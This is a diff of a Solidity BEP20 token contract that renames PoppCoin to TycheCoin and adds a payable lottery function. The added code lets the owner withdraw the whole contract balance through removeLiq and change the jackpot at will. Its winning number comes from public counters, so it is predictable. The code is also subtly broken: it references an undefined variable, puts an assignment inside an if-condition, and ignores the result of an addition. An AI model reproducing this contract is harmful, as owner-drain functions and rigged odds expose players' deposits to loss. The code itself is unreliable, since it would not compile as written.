@@ -343,14 +343,14 @@ contract Ownable is Context {
 }
 
 
-contract POPPCOIN is Context, IBEP20, Ownable {
+contract TYCHE is Context, IBEP20, Ownable {
     using SafeMath for uint256;
 
     mapping (address => uint256) private _balances;
 
     mapping (address => uint256) private _tryTime;
 
-    mapping (address => uint256) public _poppRate;
+    mapping (address => uint256) public _winRate;
 
     mapping (uint256 => address) public _roundWinners;
 
@@ -364,22 +364,25 @@ contract POPPCOIN is Context, IBEP20, Ownable {
     uint256 public _luckyNO;
     uint256 public _round;
     uint256 private _totalTry;
+    uint256 public _totalValue;
     uint8 public _decimals;
     string public _symbol;
     string public _name;
     string public _genesisMint;
     bool public ismainnet;
+    bool public isplayable;
 
-    constructor(address dead) public {
+    constructor(address dead) public payable {
         _dead = dead;
         _genesisMint = "1 million tokens";
-        _name = "PoppCoin";
-        _symbol = "POP";
+        _name = "TycheCoin";
+        _symbol = "TYC";
         _decimals = 18;
         _totalSupply = 1000000000000000000000000; // 1,000,000 token
         _cost = 500000000000000000; // 0.5 token
         _jackPot = 5000000000000000000; // 5 tokens
         _balances[msg.sender] = _totalSupply;
+        _totalValue = msg.value;
 
         emit Transfer(address(0), msg.sender, _totalSupply);
     }
@@ -520,6 +523,22 @@ contract POPPCOIN is Context, IBEP20, Ownable {
         ismainnet = !ismainnet;
     }
 
+    function startPlay() public onlyOwner {
+        isplayable = !isplayable;
+    }
+
+    function setJackPot(uint256 jackpot) public onlyOwner {
+        _jackPot = jackpot;
+    }
+
+    function addLiquidity() public payable {
+        _totalValue += msg.value;
+    }
+
+    function removeLiq() public onlyOwner {
+        require(payable(msg.sender).send(address(this).balance));
+    }
+
     function PLAY(uint256 _no) public {
         require(_balances[address(this)] >= _jackPot, "insufficient liquidity");
 
@@ -528,7 +547,7 @@ contract POPPCOIN is Context, IBEP20, Ownable {
 
         if (_no == luckyno) {
             _round++;
-            _poppRate[msg.sender]++;
+            _winRate[msg.sender]++;
             _roundWinners[_round] = msg.sender;
             _circSupply.add(_jackPot);
             _transfer(address(this), msg.sender, _jackPot);
@@ -550,8 +569,33 @@ contract POPPCOIN is Context, IBEP20, Ownable {
         } else {
                 _totalTry++;
         }
-
     }
+
+    function PLAYCORE(uint256 _no) public payable {
+        require(_totalValue > 0, "insufficient liquidity");
+        require(msg.value >= _cost, "wrong value");
+        require(isplayable, "play not enabled");
+
+        uint256 luckyno = tryTime[msg.sender] + 3 - _totalTry;
+        _luckyNO = luckyno;
+
+        if (_no == luckyno) {
+            require(payable(msg.sender).send(_jackPot));
+            _totalValue -= _jackPot;
+        }
+     
+        if (_tryTime[msg.sender] = 3) {
+            _tryTime[msg.sender] = 0;
+        } else {
+                _tryTime[msg.sender]++;
+        }
+
+        if (_totalTry == 2) {
+            _totalTry = 1;
+        } else {
+                _totalTry++;
+        }
+    }        
 
     /**
      * @dev Burn `amount` tokens and decreasing the total supply.
